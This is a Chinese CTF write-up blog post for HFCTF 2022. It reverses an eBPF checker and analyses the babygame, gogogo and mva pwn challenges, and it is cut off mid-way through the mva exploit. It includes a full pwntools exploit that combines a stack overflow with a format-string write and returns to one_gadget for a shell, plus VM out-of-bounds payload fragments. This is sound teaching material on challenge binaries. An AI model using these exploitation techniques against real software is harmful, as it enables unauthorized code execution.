<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>HFCTF-2022 - TokameinE-二进制复现报告 | TokameinE - 雨声淅淅沥沥，犬吠永不止息</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
 document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark')
 document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: Bender;
 src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
}
@font-face {
 font-family: BenderLight;
 src: local('BenderLight'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('/img/bg.jpg');
  --light-background: url('/img/91110244_p0.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li><li class="navItem"><a class="navBlock" href="/links/"><span class="navItemTitle">Links</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>HFCTF-2022 - TokameinE-二进制复现报告</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2022-03-26T13:11:50.000Z" id="date"> 2022-03-26</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-12-29T04:50:35.000Z" id="updated"> 2024-12-29</time></div></span></div></div><hr><div id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>姑且参加了比赛，赛题感觉都不错，适当做了个复现。PWN那边还有一道内核没复现，主要是受限于目前笔者的技术水平，内核部分的知识还不太够用，以后有机会了会另外复现的。</p>
<p>最有意思的题目应该是 vdq 那题，属于是佩服做出来的师傅，那个最终的 payload 构造花了我一整天时间，整道题做了有两天半……怎么说呢，好痛苦啊。</p>
<p>另外 fpbe 和 mva 也挺好玩的，前者主要是给我科普了一波 ebpf ，后者主要是笔者觉得自己写的 exp 挺精巧的，自我感觉还行。不过博客的模板似乎不识别五级标题，看着确实有点不舒服了……</p>
<p>也欢迎师傅们捉虫。</p>
<h2 id="REV"><a href="#REV" class="headerlink" title="REV"></a>REV</h2><h3 id="fpbe"><a href="#fpbe" class="headerlink" title="fpbe"></a>fpbe</h3><p>第一次接触ebfp的逆向，才知道其原理和分析方式（上次D3的那题ebfp没看）。</p>
<p>主要逻辑只有几行：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">err = uprobed_function(*array, array[1], array[2], array[3]);<br>  if ( err == 1 )<br>  printf(&quot;flag: HFCTF&#123;%s&#125;\n&quot;, flag, &amp;flag[12], v7, v8, v9, argv);<br>else<br>  puts(&quot;not flag&quot;);<br></code></pre></td></tr></table></figure>

<p>但比赛的时候因为对ebfp的执行逻辑不熟悉，以及IDA动调的时候没能真正模拟其执行流，以至于没能顺利写完这道逆向签到题。</p>
<h3 id="执行逻辑"><a href="#执行逻辑" class="headerlink" title="执行逻辑"></a>执行逻辑</h3><p>ebfp通过bpf_program__attach_uprobe将上述<strong>uprobed_function</strong>函数hook掉了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">skel-&gt;links.uprobe = bpf_program__attach_uprobe(<br>                              skel-&gt;progs.uprobe,<br>                              0,<br>                              0,<br>                              &quot;/proc/self/exe&quot;,<br>                              uprobed_function - base_addr);<br></code></pre></td></tr></table></figure>

<p>当程序执行uprobed_function函数时，会通过内核的系统调用转移到hook的函数去。</p>
<p>跟踪skel向下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fpbe_bpf__open_and_load-&gt;fpbe_bpf__open-&gt;<br>fpbe_bpf__open_opts-&gt;fpbe_bpf__create_skeleton<br></code></pre></td></tr></table></figure>

<p>fpbe_bpf__create_skeleton中创建uprobe的具体内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if ( s-&gt;progs )<br>&#123;<br>  s-&gt;progs-&gt;name = &quot;uprobe&quot;;<br>  s-&gt;progs-&gt;prog = &amp;obj-&gt;progs.uprobe;<br>  s-&gt;progs-&gt;link = &amp;obj-&gt;links.uprobe;<br>  s-&gt;data_sz = 1648LL;<br>  s-&gt;data = &amp;unk_4F4018;<br>  result = 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>其中data是最终的执行代码，size为对应比特大小。<br>接下来用gdb将其加载到内存，然后就可以用bpftool去dump出具体内容了：(有删减)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">   0: (79) r2 = *(u64 *)(r1 +104) //flag[2]<br>   3: (79) r3 = *(u64 *)(r1 +112) //flag[3]<br>   6: (bf) r4 = r3<br>   7: (27) r4 *= 28096<br>   8: (bf) r5 = r2<br>   9: (27) r5 *= 64392<br>  10: (0f) r5 += r4<br>  11: (79) r4 = *(u64 *)(r1 +96) //flag[1]<br>  14: (bf) r0 = r4<br>  15: (27) r0 *= 29179<br>  16: (0f) r5 += r0<br>  17: (79) r1 = *(u64 *)(r1 +88) //flag[0]<br><br>  24: (bf) r0 = r1<br>  25: (27) r0 *= 52366<br>  26: (0f) r5 += r0<br>  27: (b7) r6 = 1<br>  28: (18) r0 = 0xbe18a1735995<br>  30: (5d) if r5 != r0 goto pc+66<br>//0xbe18a1735995 == flag[0]*52366 + flag[1]*29179 + flag[2]*64392 + flag[3]*28096<br><br>  31: (bf) r5 = r3<br>  32: (27) r5 *= 61887<br>  33: (bf) r0 = r2<br>  34: (27) r0 *= 27365<br>  35: (0f) r0 += r5<br>  36: (bf) r5 = r4<br>  37: (27) r5 *= 44499<br>  38: (0f) r0 += r5<br>  39: (bf) r5 = r1<br>  40: (27) r5 *= 37508<br>  41: (0f) r0 += r5<br>  42: (18) r5 = 0xa556e5540340<br>  44: (5d) if r0 != r5 goto pc+52<br>//0xa556e5540340 == flag[0]*37508 + flag[1]*44499 + flag[2]*27365 + flag[3]*61887 <br><br>  45: (bf) r5 = r3<br>  46: (27) r5 *= 56709<br>  47: (bf) r0 = r2<br>  48: (27) r0 *= 32808<br>  49: (0f) r0 += r5<br>  50: (bf) r5 = r4<br>  51: (27) r5 *= 25901<br>  52: (0f) r0 += r5<br>  53: (bf) r5 = r1<br>  54: (27) r5 *= 59154<br>  55: (0f) r0 += r5<br>  56: (18) r5 = 0xa6f374484da3<br>  58: (5d) if r0 != r5 goto pc+38<br>//0xa6f374484da3 == flag[0]*59154 + flag[1]*25901 + flag[2]*32808 + flag[3]*56709 <br><br>  59: (bf) r5 = r3<br>  60: (27) r5 *= 33324<br>  61: (bf) r0 = r2<br>  62: (27) r0 *= 51779<br>  63: (0f) r0 += r5<br>  64: (bf) r5 = r4<br>  65: (27) r5 *= 31886<br>  66: (0f) r0 += r5<br>  67: (bf) r5 = r1<br>  68: (27) r5 *= 62010<br>  69: (0f) r0 += r5<br>  70: (18) r5 = 0xb99c485a7277<br>  72: (5d) if r0 != r5 goto pc+24<br>//0xb99c485a7277 == flag[0]*62010 + flag[1]*31886 + flag[2]*51779 + flag[3]*33324 <br></code></pre></td></tr></table></figure>

<p>最后解一下上述方程组即可拿到flag。</p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="babygame"><a href="#babygame" class="headerlink" title="babygame"></a>babygame</h3><p>栈溢出先把srand的种子写掉，顺便泄露一个栈地址，然后就能算出之后的返回地址在栈中的位置了。然后用格式化字符串把返回地址写掉，再来一次格式化字符串。途中也顺便泄露一个libc地址，然后就能算出libc基址了，加上one_gadget再写回返回地址即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>import random<br>from ctypes import *<br>context.log_level=&#x27;debug&#x27;<br>context.arch = &quot;x86_64&quot;<br><br>#p=process(&quot;./babygame&quot;,env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.31.so&#x27;&#125;)<br>p=remote(&quot;120.25.205.249&quot;,37062)<br>#elf=ELF(&quot;./babygame&quot;)<br>libc = cdll.LoadLibrary(&#x27;libc.so.6&#x27;)<br>#gdb.attach(p,&quot;b*$rebase(0x1435)\nc\n&quot;)<br><br>sla=lambda a,b:p.sendlineafter(a.encode(),b)<br>sa=lambda a,b:p.sendafter(a.encode(),b)<br><br>sa(&quot;name:&quot;,&quot;a&quot;*256+&quot;a&quot;*8+&quot;a&quot;)<br>p.recvuntil(&quot;Hello, &quot;)<br>leakdata=p.recvuntil(&quot;\x0a&quot;)[-15:-1]<br>print((leakdata))<br><br>canary=u64(leakdata[:-6].ljust(8,&quot;\x00&quot;))-0x61<br>stack_test=u64(leakdata[8:].ljust(8,&quot;\x00&quot;))<br><br>print(hex(canary))<br>print(hex(stack_test))<br>ogd=[0xe3b2e,0xe3b31,0xe3b34]<br><br>libc.srand(0x61616161)<br>p.recvuntil(&quot;paper&quot;)<br>sleep(1)<br>for i in range(100):<br>    temp=libc.rand()%3<br>    print(&quot;now temp:&quot;+hex(temp))<br>    if(temp==0):<br>        temp=1<br>    elif(temp==1):<br>        temp=2<br>    elif(temp==2):<br>        temp=0<br>    sla(&quot;round&quot;,str(temp))<br><br>offset=6<br>stack_ret=stack_test+(0x7ffcbd0edfd8-0x7ffcbd0ee1f0)<br>print(hex(stack_ret))<br>sleep(2)<br>payload=&quot;%62c&quot;+&quot;%8$hhn&quot;+&quot;%9$p%p&quot;+p64(stack_ret)<br>sla(&quot;luck&quot;,payload)<br>sleep(2)<br><br>p.recvuntil(&quot;0x&quot;)<br>data=int(&quot;0x&quot;+(p.recv(12)),16)<br>print(hex(data))<br>libc_base=data-(0x7fead012bd0a-0x7fead00ca000)<br>print(hex(libc_base))<br>one_gad=libc_base+ogd[1]<br><br>payload = fmtstr_payload(6, &#123;stack_ret: one_gad&#125;,write_size=&#x27;byte&#x27;)<br>sla(&quot;luck&quot;,payload)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h3 id="gogogo"><a href="#gogogo" class="headerlink" title="gogogo"></a>gogogo</h3><p>这题没做出来实属不应该，真没想到出题人会用这么恶心人的方式混淆（指一个个字符打印，以及拐弯抹角地硬是把简单的栈溢出藏在尾巴，搞得我这种习惯从上往下分析的累得半死不活，还以为漏洞肯定会在那个选择输入或输出的地方，属实是被整无语了）……</p>
<p>主要是 golang 中传参的方式不太一样，其中有几个值得注意的输入函数，在我们恢复传参符号以后可以看见：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">fmt_Fscanf(&quot;%d&quot;);<br>bufio___ptr_Reader__Read(qword_5514E0, v4, 0x200);<br>bufio___ptr_Reader__Read(qword_5514E0, buf, 0x800);<br>bufio___ptr_Reader__Read(qword_5514E0, v63, 0x20);<br></code></pre></td></tr></table></figure>

<blockquote>
<p>只需要在 IDA 中将这下函数的参数列表设定好，重新反编译即可看见。因为 golang 的传参方式和常规的 x86_64 不太一样，所以默认情况下 IDA 没有正常识别的参数。</p>
</blockquote>
<p>然后就能注意到，有一个输入的长度是 0x800，而 buf 直接被 IDA 识别到了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">char buf[8]; // [rsp+70h] [rbp-460h] BYREF<br></code></pre></td></tr></table></figure>

<p>而 buf 下面也没有很多缓冲区，所以直接让程序执行到这里，然后正常用 ROP 拿 shell 即可。</p>
<p>顺便一提，真正的主函数是 <strong>math_init</strong> 函数，出题人拐弯抹角的弄了很多混淆视听的东西。</p>
<p>输入序列如下：</p>
<ul>
<li>1416925456</li>
<li>通过游戏</li>
<li>E</li>
<li>4</li>
<li>payload</li>
</ul>
<p>exp 没太多技术含量，主要就是需要去跑那个小游戏，网上搜一下就能找到脚本了,所以这里就不放了。</p>
<h3 id="mva"><a href="#mva" class="headerlink" title="mva"></a>mva</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>逻辑很简单，输入虚拟机字节码然后就会开始执行了。<br>注意到 IDA 打开之后分析的错误，通过汇编就能发现是由于 <strong>switch</strong> 的优化符号表导致，适当修复符号表后可以得到如下反汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">while ( v5 )<br>&#123;<br>  v7 = sub_11E9();<br>  v6 = HIBYTE(v7);<br>  if ( v6 &gt; 0xFu )<br>    break;<br>  if ( v6 &lt;= 0xFu )<br>  &#123;<br>    switch ( v6 )<br>    &#123;<br>      case 0u:                                // nop<br>        v5 = 0;<br>        goto LABEL_102;<br>      case 1u:                                // ldr reg,val<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = v7;<br>        goto LABEL_102;<br>      case 2u:                                // add<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7)) + *(&amp;reg + v7);<br>        goto LABEL_102;<br>      case 3u:                                // sub<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7)) - *(&amp;reg + v7);<br>        goto LABEL_102;<br>      case 4u:                                // and<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7)) &amp; *(&amp;reg + v7);<br>        goto LABEL_102;<br>      case 5u:                                // or<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7))  *(&amp;reg + v7);<br>        goto LABEL_102;<br>      case 6u:                                // shr<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE2(v7)) &gt;&gt; *(&amp;reg + SBYTE1(v7));<br>        goto LABEL_102;<br>      case 7u:<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7)) ^ *(&amp;reg + v7);<br>        goto LABEL_102;<br>      case 8u:<br>        JUMPOUT(0x1780LL);<br>      case 9u:                                // push<br>        if ( espr &gt; 256 )<br>          exit(0);<br>        if ( BYTE2(v7) )<br>          stack[espr] = v7;<br>        else<br>          stack[espr] = reg;<br>        ++espr;<br>        goto LABEL_102;<br>      case 0xAu:                              // pop<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( !espr )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = stack[--espr];<br>        goto LABEL_102;<br>      case 0xBu:<br>        v8 = sub_11E9();<br>        if ( v4 == 1 )<br>          dword_403C = v8;<br>        goto LABEL_102;<br>      case 0xCu:                              // cmp<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5  (v7 &amp; 0x8000) != 0 )<br>          exit(0);<br>        v4 = *(&amp;reg + SBYTE2(v7)) == *(&amp;reg + SBYTE1(v7));<br>        goto LABEL_102;<br>      case 0xDu:                              // mul<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>          exit(0);<br>        *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7)) * *(&amp;reg + v7);<br>        goto LABEL_102;<br>      case 0xEu:                              // mov<br>        if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>          exit(0);<br>        if ( SBYTE1(v7) &gt; 5 )<br>          exit(0);<br>        *(&amp;reg + SBYTE1(v7)) = *(&amp;reg + SBYTE2(v7));<br>        goto LABEL_102;<br>      case 0xFu:                              // print stack<br>        printf(&quot;%d\n&quot;, stack[espr]);<br>        goto LABEL_102;<br>      default:<br>        goto LABEL_103;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>除了字节码为 0x8 的指令外，基本都分析出来了。代码并不复杂，说是虚拟机其实也并没有做非常复杂的封装，基本上不会有阅读障碍，不过由于 IDA 自带的一些宏定义不太方便理解，这里以 ldr 指令为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">.text:0000000000001421                 movsx   eax, [rbp+var_249]<br>.text:0000000000001428                 cdqe<br>.text:000000000000142A                 movzx   edx, [rbp+var_23E]<br>.text:0000000000001431                 mov     word ptr [rbp+rax*2+reg], dx<br></code></pre></td></tr></table></figure>

<p>var_249 处是目标寄存器编号，var_23E 处是目标操作数。这种写法经由 IDA 表现为 SBYTE2 ，所以如果觉得阅读不顺，可以直接通过汇编理解。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>注意到像是 add 或者 sub 这种有三个操作数的指令都会先检测操作数是否合法，而 mul 指令却没有：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">case 0xDu:                              // mul<br> if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>   exit(0);<br> if ( v7 &gt; 5  (v7 &amp; 0x80u) != 0 )<br>   exit(0);<br> *(&amp;reg + SBYTE2(v7)) = *(&amp;reg + SBYTE1(v7)) * *(&amp;reg + v7);<br></code></pre></td></tr></table></figure>

<p>该指令只检查了目标寄存器和源寄存器中的一个，举例来说就是</p>
<blockquote>
<p>mul r3,r2,r1</p>
</blockquote>
<p>只检查了 r3 和 r1。因此 r2 的值可以越界读取(oob read)。</p>
<p>类似的，mov指令也是如此：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">case 0xEu:                              // mov<br>  if ( SBYTE2(v7) &gt; 5  (v7 &amp; 0x800000) != 0 )<br>    exit(0);<br>  if ( SBYTE1(v7) &gt; 5 )<br>    exit(0);<br>  *(&amp;reg + SBYTE1(v7)) = *(&amp;reg + SBYTE2(v7));<br>  goto LABEL_102;<br></code></pre></td></tr></table></figure>

<p>其没有检查高位，即可以使得目标操作数向负数溢出，类似于：</p>
<blockquote>
<p>mov r1,r2</p>
</blockquote>
<p>r1 和 r2 都不能超过 4 ，但 r1 有可能是负数，存在越界写(oob write)，不过需要注意，这个只能向低地址越界，因此利用仍然有限。</p>
<p>由此一来基本也能有利用思路了：</p>
<ul>
<li>通过越界读以及打印栈数据泄露 libc_base</li>
<li>通过越界写控制执行流</li>
</ul>
<h4 id="Attack-Test"><a href="#Attack-Test" class="headerlink" title="Attack Test"></a>Attack Test</h4><p>首先我们需要尝试泄露地址，通过 mul 指令向上读取一块 libc 中的地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload+=ldr(0x1)+mul(0,-0x12+4,0)+push(1)<br>payload+=ldr(0x1)+mul(0,-0x12+5,0)+push(1)<br>payload+=ldr(0x1)+mul(0,-0x12+6,0)+push(1)<br></code></pre></td></tr></table></figure>

<p>通过 ldr 指令将 1 加载到 r0，然后用 mul 读取上方地址之后乘以 1 仍为原数，将其放入栈中，重复三次就能完整的得到一个地址。</p>
<p>但需要注意，接下来我们似乎理所应当地要用 print 把栈中数据打印出来，笔者开始也这么想，但如果您这么做了，就意味着接下来需要写返回地址为 main 函数，那么您本次就应该泄露 ELF 基址，然后通过多次返回来利用，这很麻烦，对吗？</p>
<p>于是笔者换了一个思路，既然它已经读到了一块地址，我们能不能直接让它自己算出 one_gadget 的地址？这样我们直接写返回地址到 one_gadget 就能一次性拿下了，能省去很多麻烦。</p>
<p>因此接下来我们直接在虚拟机里计算地址：</p>
